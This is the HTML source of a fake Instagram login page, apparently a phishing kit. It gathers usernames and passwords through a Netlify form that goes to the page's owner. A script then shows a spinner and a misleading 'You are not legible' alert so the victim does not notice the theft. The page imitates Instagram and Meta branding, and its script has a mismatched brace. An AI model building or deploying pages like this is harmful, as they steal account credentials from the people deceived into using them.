<!DOCTYPE html><html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Instagrame</title>
<style>
*{box-sizing:border-box;font-family:Arial,Helvetica,sans-serif}
body{
  margin:0;
  height:100vh;
  background:#0b1f2a;
  color:#fff;
  display:flex;
  flex-direction:column;
  justify-content:space-between;
}
.top{
  text-align:center;
  padding-top:20px;
  color:#9fb0bb;
  font-size:14px;
}
.center{
  width:100%;
  max-width:420px;
  margin:auto;
  padding:0 20px;
  text-align:center;
}
.logo img{
  width:70px;
  margin:40px 0;
}
input{
  width:100%;
  padding:18px;
  margin:10px 0;
  border-radius:16px;
  border:1px solid #2e4654;
  background:transparent;
  color:white;
  font-size:16px;
}
input::placeholder{color:#8ea1ac}
.login{
  width:100%;
  padding:18px;
  border:none;
  border-radius:30px;
  background:#1877f2;
  color:white;
  font-size:17px;
  font-weight:bold;
  margin-top:15px;
}
.forgot{
  margin-top:20px;
  color:#c7d3da;
  font-size:15px;
}
.bottom{
  padding:20px;
  text-align:center;
}
.create{
  width:100%;
  max-width:420px;
  margin:auto;
  padding:16px;
  border-radius:30px;
  border:1.5px solid #3b82f6;
  color:#3b82f6;
  font-weight:bold;
  font-size:16px;
}
.meta{
  margin-top:18px;
  color:#9fb0bb;
  font-size:15px;
}
</style>
</head>
<body>
<div class="top">English (UK)</div><div class="center">
  <div class="logo">
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="logo" />
  </div>
  <form name="login" method="POST" data-netlify="true" onsubmit="login(event)">
    <input type="hidden" name="form-name" value="login">
    <input name="username" type="text" placeholder="Username, email address or mobile number" required />
    <input name="password" type="password" placeholder="Password" required />
    <button class="login">Log in</button>
  </form>
  <div class="forgot">Forgotten password?</div>
</div><div class="bottom">
  <div class="create">Create new account</div>
  <div class="meta">Meta</div>
</div>
<div id="spinner" style="display:none;text-align:center;margin-top:15px;">
  <div style="width:30px;height:30px;border:4px solid #3b82f6;border-top:4px solid transparent;border-radius:50%;margin:auto;animation:spin 1s linear infinite;"></div>
</div><script>
function login(e){ e.preventDefault();{
  const spinner=document.getElementById('spinner');
  spinner.style.display='block';
  setTimeout(()=>{
    spinner.style.display='none';
    alert('You are not legible'); e.target.submit();
  },1500);
}
</script><style>
@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
</style></body>
</html>
